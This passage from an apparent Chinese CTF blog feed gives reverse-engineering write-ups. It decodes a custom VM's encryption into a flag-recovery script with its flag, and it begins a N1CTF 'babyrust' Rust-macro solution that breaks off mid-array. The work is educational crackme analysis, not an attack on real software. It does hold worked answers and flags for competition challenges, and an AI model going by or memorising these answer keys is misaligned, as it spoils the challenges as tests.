_1C: &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
_1D: ecx &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
_1F: push(memory2[ecx]);
_20: pop(eax);
_21: eax &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; ebx;
_22: push(eax);
_23: pop(memory2[ecx]);
_24: push(ebx);
_25: push(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
_27: pop(eax);
_28: push(ecx);
_29: pop(ebx);
_2A: zf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (eax &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ebx);
_2B: &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; zf:    eip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32&lt;/span&gt;;
_2D: pop(ebx);
_2E: ebx &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
_30: eip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1d&lt;/span&gt;;
_32: pop(ebx);
_33: pop(eip);
_34: push(memory2[ecx]);
_35: pop(eax);
_36: zf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (eax &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ebx);
_37: &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; zf:    eip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3d&lt;/span&gt;;
_39: ecx &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
_3B: eip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x34&lt;/span&gt;;
_3D: push(ecx);
_3E: pop(eax);
_3F: pop(eip);
_40: ecx &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
_42: push(memory2[ecx]);
_43: pop(eax);
_44: eax &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; ebx;
_45: push(eax);
_46: pop(memory2[ecx]);
_47: push(ebx);
_48: push(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
_4A: pop(eax);
_4B: push(ecx);
_4C: pop(ebx);
_4D: zf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (eax &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ebx);
_4E: &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; zf:    eip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x55&lt;/span&gt;;
_50: pop(ebx);
_51: ebx &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
_53: eip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt;;
_55: pop(ebx);
_56: pop(eip);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现其实是调用了几个函数，分别在0x34、0x40、0x1D&lt;/p&gt;
&lt;p&gt;0x34处的函数判断了长度，0x1D处的函数从后往前异或数字，每次加2，0x40处的函数从后往前进行加法，数字每次加1&lt;/p&gt;
&lt;p&gt;所以最后的加密算法为：首先从后往前 ^36, ^38, ^40，随后从后往前+0, +1, +2…，最后从后往前 ^72, ^74, ^76…&lt;/p&gt;
&lt;p&gt;反向解密即可&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;s2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD5&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x31&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3A&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x57&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x54&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x78&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x35&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x47&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11&lt;/span&gt;
]

flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;
y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
z &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; s2[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]:
    flag &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(((i &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; z) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; y) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; x)
        x &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        y &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        z &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;

print (flag[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
&lt;span style=&#34;color:#75715e&#34;&gt;# &amp;#39;flag{Now_Y0u_Know_th4_Signa1_0f_Linux!!!!}&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Resent RE Challenge</title>
        <link>/post/resent-re-challenge/</link>
        <pubDate>Tue, 23 Nov 2021 14:06:23 +0000</pubDate>
        
        <guid>/post/resent-re-challenge/</guid>
        <description>&lt;ul&gt;
&lt;li&gt;[N1CTF 2021]babyrust&lt;/li&gt;
&lt;li&gt;[N1CTF 2021]Py&lt;/li&gt;
&lt;li&gt;[L3HCTF 2021]double-joy&lt;/li&gt;
&lt;li&gt;[L3HCTF 2021]Load&lt;/li&gt;
&lt;li&gt;[hack.lu]pycoin&lt;/li&gt;
&lt;li&gt;[hack.lu]atareee&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;TODO:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;[L3HCTF 2021]idaaaaaaaa&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;n1ctfbabyrust&#34;&gt;[N1CTF]babyrust&lt;/h2&gt;
&lt;p&gt;题目直接给了Rust源码，之前没有见过，现查文档学习&lt;/p&gt;
&lt;p&gt;首先main函数里只是调用了一个 &lt;code&gt;check!&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; check&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;s &lt;span style=&#34;color:#75715e&#34;&gt;/*your answer*/&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;main&lt;/code&gt; 上面就是 &lt;code&gt;check&lt;/code&gt; 的实现&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;macro_rules! check {
    (&lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;s n1ctf{&lt;span style=&#34;color:#75715e&#34;&gt;$Never&lt;/span&gt;:&lt;span style=&#34;color:#a6e22e&#34;&gt;tt&lt;/span&gt;}) &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; {
        check&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(stringify!(&lt;span style=&#34;color:#75715e&#34;&gt;$Never&lt;/span&gt;))
    };
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;macro_rules!&lt;/code&gt; 是个宏定义，里面的 &lt;code&gt;@s&lt;/code&gt;，&lt;code&gt;@e&lt;/code&gt; 应该是类似字符串匹配的东西&lt;/p&gt;
&lt;p&gt;一开始的 &lt;code&gt;(@s n1ctf{$Never:tt})&lt;/code&gt; 就把flag中去除 &lt;code&gt;n1ctf{}&lt;/code&gt; 的部分存到了 &lt;code&gt;$Never&lt;/code&gt; 变量中，&lt;code&gt;stringify!&lt;/code&gt; 将其转换为字符串常量&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;stringify!&lt;/code&gt; 为 Rust 内置宏。其接收一个 Rust 表达式，如 1 + 2 ， 然后在编译时将表达式转换为一个字符串常量，如 &amp;ldquo;1 + 2&amp;rdquo; 。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;接下来的宏定义有很多类似这个的：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;    (&lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;e (&lt;span style=&#34;color:#75715e&#34;&gt;$Never&lt;/span&gt;:&lt;span style=&#34;color:#a6e22e&#34;&gt;expr&lt;/span&gt;,&lt;span style=&#34;color:#75715e&#34;&gt;$Gonna&lt;/span&gt;:&lt;span style=&#34;color:#a6e22e&#34;&gt;expr&lt;/span&gt;,&lt;span style=&#34;color:#75715e&#34;&gt;$Give&lt;/span&gt;:&lt;span style=&#34;color:#a6e22e&#34;&gt;expr&lt;/span&gt;); (Never gonna give you up &lt;span style=&#34;color:#75715e&#34;&gt;$($code&lt;/span&gt;:&lt;span style=&#34;color:#a6e22e&#34;&gt;tt&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; {
        &lt;span style=&#34;color:#75715e&#34;&gt;$Give&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt;;
        check&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;e (&lt;span style=&#34;color:#75715e&#34;&gt;$Never&lt;/span&gt;,&lt;span style=&#34;color:#75715e&#34;&gt;$Gonna&lt;/span&gt;,&lt;span style=&#34;color:#75715e&#34;&gt;$Give&lt;/span&gt;); (&lt;span style=&#34;color:#75715e&#34;&gt;$($code&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;));
    };
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;理解一下大概就是根据传入的 &lt;code&gt;code&lt;/code&gt; 字符串开头是否为 &lt;code&gt;Never gonna give you up&lt;/code&gt;，来判断是否进入这个定义，所以判断是一个根据字符串内容实现的Rust的简单vm，指令就是对 &lt;code&gt;$Never, $Gone, $Give&lt;/code&gt;三个变量进行变化&lt;/p&gt;
&lt;p&gt;为了快速分析，直接在各个指令上加个输出，然后编译运行，会发现整体逻辑大概就是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;$Gonna&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;$Never&lt;/span&gt;[&lt;span style=&#34;color:#75715e&#34;&gt;$Give&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// 将当前位置数据取出
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;$Gonna&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt;;   &lt;span style=&#34;color:#75715e&#34;&gt;// 每次加1，执行多次
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;$Gonna&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt;;   &lt;span style=&#34;color:#75715e&#34;&gt;// 每次减1，执行多次
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;$Never&lt;/span&gt;[&lt;span style=&#34;color:#75715e&#34;&gt;$Give&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;$Gonna&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// 将计算结果存回去
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;$Give&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// index + 1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;于是修改代码如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#![recursion_limit=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;8192&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;]&lt;/span&gt;   &lt;span style=&#34;color:#75715e&#34;&gt;// 添加在开头
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// 宏定义如下两个定义添加输出，可以打印出明文和密文
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    (&lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;e (&lt;span style=&#34;color:#75715e&#34;&gt;$Never&lt;/span&gt;:&lt;span style=&#34;color:#a6e22e&#34;&gt;expr&lt;/span&gt;,&lt;span style=&#34;color:#75715e&#34;&gt;$Gonna&lt;/span&gt;:&lt;span style=&#34;color:#a6e22e&#34;&gt;expr&lt;/span&gt;,&lt;span style=&#34;color:#75715e&#34;&gt;$Give&lt;/span&gt;:&lt;span style=&#34;color:#a6e22e&#34;&gt;expr&lt;/span&gt;); (Never gonna say goodbye &lt;span style=&#34;color:#75715e&#34;&gt;$($code&lt;/span&gt;:&lt;span style=&#34;color:#a6e22e&#34;&gt;tt&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; {
        &lt;span style=&#34;color:#75715e&#34;&gt;$Gonna&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;$Never&lt;/span&gt;[&lt;span style=&#34;color:#75715e&#34;&gt;$Give&lt;/span&gt;];
        println!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Gonna = Never[Give: {}]: {}&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;$Give&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;$Never&lt;/span&gt;[&lt;span style=&#34;color:#75715e&#34;&gt;$Give&lt;/span&gt;]);
        check&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;e (&lt;span style=&#34;color:#75715e&#34;&gt;$Never&lt;/span&gt;,&lt;span style=&#34;color:#75715e&#34;&gt;$Gonna&lt;/span&gt;,&lt;span style=&#34;color:#75715e&#34;&gt;$Give&lt;/span&gt;); (&lt;span style=&#34;color:#75715e&#34;&gt;$($code&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;));
    };
    (&lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;e (&lt;span style=&#34;color:#75715e&#34;&gt;$Never&lt;/span&gt;:&lt;span style=&#34;color:#a6e22e&#34;&gt;expr&lt;/span&gt;,&lt;span style=&#34;color:#75715e&#34;&gt;$Gonna&lt;/span&gt;:&lt;span style=&#34;color:#a6e22e&#34;&gt;expr&lt;/span&gt;,&lt;span style=&#34;color:#75715e&#34;&gt;$Give&lt;/span&gt;:&lt;span style=&#34;color:#a6e22e&#34;&gt;expr&lt;/span&gt;); (Never gonna tell a lie and hurt you &lt;span style=&#34;color:#75715e&#34;&gt;$($code&lt;/span&gt;:&lt;span style=&#34;color:#a6e22e&#34;&gt;tt&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; {
        &lt;span style=&#34;color:#75715e&#34;&gt;$Never&lt;/span&gt;[&lt;span style=&#34;color:#75715e&#34;&gt;$Give&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;$Gonna&lt;/span&gt;;
        println!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Never[Give: {}] = Gonna: {}&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;$Give&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;$Gonna&lt;/span&gt;);
        check&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;e (&lt;span style=&#34;color:#75715e&#34;&gt;$Never&lt;/span&gt;,&lt;span style=&#34;color:#75715e&#34;&gt;$Gonna&lt;/span&gt;,&lt;span style=&#34;color:#75715e&#34;&gt;$Give&lt;/span&gt;); (&lt;span style=&#34;color:#75715e&#34;&gt;$($code&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;));
    };

&lt;span style=&#34;color:#75715e&#34;&gt;// 随便设置一个容易计算的明文
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; check&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;s n1ctf{&lt;span style=&#34;color:#ae81ff&#34;&gt;00000000000000000000000000000000&lt;/span&gt;}&lt;span style=&#34;color:#75715e&#34;&gt;/*your answer*/&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;加密只有加减法，所以偏移始终相等&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;148&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;143&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;121&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;186&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;106&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;133&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;164&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;166&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;167&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;121&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;174&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;147&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;148&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;167&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;161&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;151&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;149&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;132&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;188&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;141&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;127&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;151&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;
]
fake_cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;131&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;124&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;118&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;165&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;131&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;163&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;149&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;165&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;104&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;153&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;145&lt;/span&gt;, 
